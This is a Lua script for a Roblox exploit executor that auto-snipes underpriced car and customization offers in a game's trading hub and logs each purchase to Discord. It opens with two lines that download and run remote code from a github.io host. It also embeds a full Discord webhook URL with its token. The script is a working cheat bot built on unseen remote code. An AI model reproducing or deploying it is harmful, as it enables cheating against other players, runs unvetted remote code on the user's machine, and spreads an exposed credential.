loadstring(game:HttpGet("https://amukerd.github.io/rbx-scripts/cdt/extra.lua"))()
loadstring(game:HttpGet("https://amukerd.github.io/rbx-scripts/cdt/checkin.lua"))()

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

local GetOffersRemote = ReplicatedStorage.Remotes.Services.TradingHubServiceRemotes.GetOffers
local GetRapRemote = ReplicatedStorage.Remotes.Services.RapRemotes.GetRap
local OfferPurchaseRemote = ReplicatedStorage.Remotes.Services.TradingHubServiceRemotes.OfferPurchase

local WebhookURL = "https://discord.com/api/webhooks/1480676513668923627/c-7JOdimxEYnh3Ol2DNcCuzHyPaCrZ015TTlDnGL3aM7Rg42zRJZhFSAc3qmqNK8t51I"

local CarsDatabase = require(ReplicatedStorage.Databases.Cars)
local CarCustomization = require(ReplicatedStorage.Databases.CarCustomization)

local RAP_PERCENT = 0.85
local SCAN_INTERVAL = 0.5

local activeThreads = {}
local currentOffersByPlayer = {}
local boughtItems = {}

local function formatNumber(value)
    return tostring(value):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end

function GetCustomizationIcon(input)
    local categoryName, itemKey = input:match("^(.-)%-(.+)$")
    if not categoryName then return nil end

    local category = CarCustomization.GetCustomizationData(categoryName)
    if not category then return nil end

    local carName, specificItem = itemKey:match("^(.-)/(.-)$")
    local itemName = specificItem or itemKey

    local itemInstance

    if carName and category.ItemsPerCarFolder then
        local carFolder = category.ItemsPerCarFolder:FindFirstChild(carName)
        if carFolder then
            itemInstance = carFolder:FindFirstChild(itemName)
        end
    end

    if not itemInstance and category.ItemsFolder then
        itemInstance = category.ItemsFolder:FindFirstChild(itemName)
    end

    if not itemInstance then
        return category.Image or ""
    end

    local attrIcon = itemInstance:GetAttribute("Icon")
    if attrIcon then return attrIcon end

    if categoryName == "Wrap" then
        local img = itemInstance:FindFirstChild("Img")
        return img and ("rbxassetid://" .. img.Value) or "rbxassetid://8848520392"
    end

    if categoryName == "Spoiler" then
        local img = itemInstance:FindFirstChild("Img")
        if img then return img.Value end
    end

    if categoryName == "UnderglowTexture" then
        local tex = itemInstance:FindFirstChildWhichIsA("Texture", true)
        return tex and tex.Texture or ""
    end

    if categoryName == "TireSmokeTexture" then
        local emitter = itemInstance:FindFirstChildWhichIsA("ParticleEmitter", true)
        return emitter and emitter.Texture or ""
    end

    return category.Image or ""
end

local function sendWebhook(itemName, price, rapValue, sellerName)
    local requestFunc = http_request or request or (http and http.request) or HttpPost
    if not requestFunc then return end

    task.spawn(function()
        local itemData = CarsDatabase[itemName]
        local imageUrl = ""
        local displayName = itemName
        local rawImageString = nil

        if itemData then
            displayName = itemData.DisplayName or itemName
            rawImageString = itemData.Image
        else
            rawImageString = GetCustomizationIcon(itemName)
        end

        if rawImageString and rawImageString ~= "" then
            local assetId = string.match(rawImageString, "%d+")
            
            if assetId then
                local thumbApiUrl = "https://thumbnails.roblox.com/v1/assets?assetIds=" .. assetId .. "&returnPolicy=PlaceHolder&size=420x420&format=png"
                
                pcall(function()
                    local res = requestFunc({
                        Url = thumbApiUrl,
                        Method = "GET"
                    })
                    if res and res.Body then
                        local data = HttpService:JSONDecode(res.Body)
                        if data and data.data and data.data[1] then
                            imageUrl = data.data[1].imageUrl or ""
                        end
                    end
                end)
            end
        end

        local embedData = {
            title = "Car Transaction Log",
            color = 16711680,
            fields = {
                { name = "Item Name", value = tostring(displayName), inline = true },
                { name = "Price", value = tostring(formatNumber(price)), inline = true },
                { name = "RAP Value", value = tostring(formatNumber(rapValue)), inline = true },
                { name = "Seller", value = tostring(sellerName), inline = false }
            }
        }

        if imageUrl ~= "" then
            embedData.thumbnail = {
                url = imageUrl
            }
        end

        pcall(function()
            requestFunc({
                Url = WebhookURL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({
                    embeds = { embedData }
                })
            })
        end)
    end)
end

local function getRap(targetPlayer, offer)
    if offer.Item and (offer.Item.Type == "Car" or offer.Item.Type == "Customization") then
        local offerId = offer.OfferId
        local itemName = offer.Item.Name
        local rapName = itemName

        if offer.Item.Type == "Customization" then
            rapName = offer.Item.Category .. "-" .. itemName
        end

        local price = offer.PriceInTokens
        if price and not boughtItems[offerId] then
            task.wait(0.01)
            local rapSuccess, rapValue = pcall(function()
                return GetRapRemote:InvokeServer(rapName)
            end)

            if rapSuccess and rapValue then
                if rapValue >= 15000 and price <= (rapValue * RAP_PERCENT) then
                    boughtItems[offerId] = true
                    local buySuccess, result = pcall(function()
                        return OfferPurchaseRemote:InvokeServer(targetPlayer, offer)
                    end)

                    if buySuccess and result then
                        print("Purchase Response:", buySuccess, result)
                        sendWebhook(itemName, price, rapValue, targetPlayer.Name)
                    else
                        boughtItems[offerId] = nil
                        warn("Purchase failed:", itemName, result)
                    end
                end
            end
        end
    end
end

local function watchPlayer(targetPlayer)
    currentOffersByPlayer[targetPlayer] = {}
    local currentOffers = currentOffersByPlayer[targetPlayer]

    local success, offers = pcall(function()
        return GetOffersRemote:InvokeServer(targetPlayer)
    end)

    if success and typeof(offers) == "table" then
        for _, offer in ipairs(offers) do
            currentOffers[offer.OfferId] = true
            task.spawn(getRap, targetPlayer, offer)
        end
    end

    while targetPlayer.Parent do
        task.wait(SCAN_INTERVAL)

        local ok, newOffers = pcall(function()
            return GetOffersRemote:InvokeServer(targetPlayer)
        end)

        if ok and typeof(newOffers) == "table" then
            local seenIds = {}
            local freshOffers = {}

            for _, offer in ipairs(newOffers) do
                local id = offer.OfferId
                seenIds[id] = true
                if not currentOffers[id] then
                    table.insert(freshOffers, offer)
                end
            end

            -- drop offers that no longer exist
            for id in pairs(currentOffers) do
                if not seenIds[id] then
                    currentOffers[id] = nil
                end
            end

            -- add + process only the new ones
            for _, offer in ipairs(freshOffers) do
                currentOffers[offer.OfferId] = true
                task.spawn(getRap, targetPlayer, offer)
            end
        end
    end

    currentOffersByPlayer[targetPlayer] = nil
end

local function startWatching(player)
    if player == LocalPlayer then
        return
    end
    if activeThreads[player] then
        return
    end
    activeThreads[player] = task.spawn(function()
        watchPlayer(player)
    end)
end

local function stopWatching(player)
    local thread = activeThreads[player]
    if thread then
        task.cancel(thread)
        activeThreads[player] = nil
    end
    currentOffersByPlayer[player] = nil
end

Players.PlayerAdded:Connect(startWatching)
Players.PlayerRemoving:Connect(stopWatching)

for _, player in ipairs(Players:GetPlayers()) do
    startWatching(player)
end

print("--- Lobby Monitor Started ---")
